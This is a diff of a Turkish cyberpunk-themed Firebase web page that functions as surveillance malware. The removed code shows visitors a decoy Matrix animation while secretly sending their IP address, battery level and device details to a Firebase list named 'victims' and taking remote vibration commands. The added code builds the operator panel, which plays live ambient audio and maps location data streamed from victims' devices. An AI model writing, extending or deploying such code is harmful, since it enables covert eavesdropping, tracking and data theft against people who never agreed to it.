@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Siber-Punk Komuta Merkezi</title>
+    <title>Siber-Punk Kontrol Paneli</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -15,120 +15,41 @@
             font-family: 'Courier New', monospace;
             margin: 0;
             padding: 0;
-            overflow: hidden;
         }
-        .matrix {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-        }
-        .matrix-code {
-            font-family: monospace;
-            font-size: 16px;
-            line-height: 1.2;
-            color: #00ff00;
-            text-shadow: 0 0 5px #00ff00;
-            animation: matrix 2s linear infinite;
-        }
-        @keyframes matrix {
-            0% {
-                opacity: 0;
-                transform: translateY(-100%);
-            }
-            10% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-            90% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-            100% {
-                opacity: 0;
-                transform: translateY(100%);
-            }
-        }
-        .terminal {
+        .control-panel {
             background-color: #111;
             border: 2px solid #00ff00;
             padding: 20px;
             margin: 20px;
             box-shadow: 0 0 10px #00ff00;
             border-radius: 10px;
-            display: none;
         }
-        .task-button {
-            background-color: #00ff00;
-            color: #000;
-            padding: 10px 20px;
-            margin: 5px;
-            border: none;
-            cursor: pointer;
-            transition: all 0.3s;
-            border-radius: 5px;
-            font-weight: bold;
-            text-shadow: 0 0 2px #000;
-        }
-        .task-button:hover {
-            background-color: #00aa00;
-            transform: scale(1.05);
-        }
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background-color: #00ff00;
-            color: #000;
-            padding: 10px 20px;
-            border-radius: 5px;
-            display: none;
-            z-index: 20;
-        }
-        .scan-animation {
-            display: none;
-            text-align: center;
-            margin-top: 50px;
-        }
-        .scan-line {
+        .audio-player {
             width: 100%;
-            height: 2px;
+            height: 50px;
             background-color: #00ff00;
-            position: relative;
-            animation: scan 2s linear infinite;
+            margin: 10px 0;
         }
-        @keyframes scan {
-            0% {
-                top: 0;
-            }
-            100% {
-                top: 100%;
-            }
+        .map-container {
+            width: 100%;
+            height: 400px;
+            background-color: #000;
+            margin: 10px 0;
         }
     </style>
 </head>
 <body>
-    <div id="matrixScreen" class="matrix">
-        <div class="matrix-code">
-            <pre id="matrixText"></pre>
-        </div>
-    </div>
-    <div id="commandCenter" class="terminal">
-        <h1 class="text-2xl font-bold mb-4">Siber-Punk Komuta Merkezi</h1>
+    <div class="control-panel">
+        <h1 class="text-2xl font-bold mb-4">Siber-Punk Kontrol Paneli</h1>
         <div class="mb-4">
-            <button class="task-button" onclick="sendTask('flashlight')">Flashlight Aç</button>
-            <button class="task-button" onclick="sendTask('vibration')">Vibration Gönder</button>
-            <button class="task-button" onclick="sendTask('message')">Mesaj Pop-up Çıkar</button>
+            <h2 class="text-xl font-bold mb-2">Canlı Ortam Dinleme</h2>
+            <div id="audioPlayer" class="audio-player"></div>
         </div>
-        <div id="taskStatus" class="mt-4"></div>
+        <div class="mb-4">
+            <h2 class="text-xl font-bold mb-2">Konum İzleme</h2>
+            <div id="mapContainer" class="map-container"></div>
+        </div>
     </div>
-    <div id="notification" class="notification"></div>
     <script>
         // Firebase yapılandırması
         const firebaseConfig = {
@@ -145,97 +66,49 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        // URL parametrelerini kontrol et
-        const urlParams = new URLSearchParams(window.location.search);
-        const isAdmin = urlParams.get('admin');
-        
-        // Matrix animasyonu için rastgele karakterler oluştur
-        function generateMatrixCode() {
-            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            let result = "";
-            for (let i = 0; i < 1000; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return result;
-        }
-        
-        // Matrix animasyonunu başlat
-        function startMatrixAnimation() {
-            const matrixText = document.getElementById('matrixText');
-            setInterval(() => {
-                matrixText.textContent = generateMatrixCode();
-            }, 100);
-        }
-        
-        // Cihaz bilgilerini al ve Firebase'e kaydet
-        async function getDeviceInfo() {
-            try {
-                // IP adresini al
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-                
-                // Pil seviyesini al (sadece mobil cihazlar için)
-                let batteryLevel = 'N/A';
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
-                }
-                
-                // Cihaz markasını al
-                const deviceBrand = navigator.userAgent;
-                
-                // Bilgileri Firebase'e kaydet
-                database.ref('victims').push({
-                    ip: ipAddress,
-                    battery: batteryLevel,
-                    device: deviceBrand,
-                    timestamp: firebase.database.ServerValue.TIMESTAMP
-                });
-            } catch (error) {
-                console.error('Cihaz bilgileri alınamadı:', error);
-            }
-        }
-        
-        // Sayfa yüklendiğinde ekranı göster
-        window.onload = function() {
-            if (isAdmin === 'true') {
-                document.getElementById('matrixScreen').style.display = 'none';
-                document.getElementById('commandCenter').style.display = 'block';
-            } else {
-                document.getElementById('matrixScreen').style.display = 'block';
-                startMatrixAnimation();
-                getDeviceInfo();
-                listenForCommands();
-            }
-        };
-        
-        // Komutları dinle
-        function listenForCommands() {
-            database.ref('commands').on('value', (snapshot) => {
-                const command = snapshot.val();
-                if (command === 'vibration') {
-                    navigator.vibrate([100, 50, 100]);
-                    database.ref('commands').set(null);
-                }
+        // Ses verilerini dinle
+        function listenForAudio() {
+            database.ref('audio').on('child_added', (snapshot) => {
+                const audioData = snapshot.val().data;
+                playAudio(audioData);
             });
         }
         
-        // Görev gönderme fonksiyonu
-        function sendTask(task) {
-            database.ref('commands').set(task);
-            document.getElementById('taskStatus').innerHTML = `<p>Görev gönderildi: ${task}</p>`;
+        // Ses verilerini çal
+        function playAudio(audioData) {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const audioBuffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
+            const channelData = audioBuffer.getChannelData(0);
+            
+            for (let i = 0; i < audioData.length; i++) {
+                channelData[i] = audioData[i];
+            }
+            
+            const source = audioContext.createBufferSource();
+            source.buffer = audioBuffer;
+            source.connect(audioContext.destination);
+            source.start();
         }
         
-        // Görev tamamlandığında bildirim göster
-        function showNotification(message) {
-            const notification = document.getElementById('notification');
-            notification.innerHTML = message;
-            notification.style.display = 'block';
-            setTimeout(() => {
-                notification.style.display = 'none';
-            }, 3000);
+        // Konum verilerini dinle
+        function listenForLocation() {
+            database.ref('location').on('child_added', (snapshot) => {
+                const locationData = snapshot.val();
+                updateMap(locationData.latitude, locationData.longitude);
+            });
         }
+        
+        // Haritayı güncelle
+        function updateMap(latitude, longitude) {
+            const mapContainer = document.getElementById('mapContainer');
+            mapContainer.innerHTML = `<iframe width="100%" height="100%" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"></iframe>`;
+        }
+        
+        // Sayfa yüklendiğinde dinleme fonksiyonlarını başlat
+        window.onload = function() {
+            listenForAudio();
+            listenForLocation();
+        };
     </script>
 </body>
 </html>
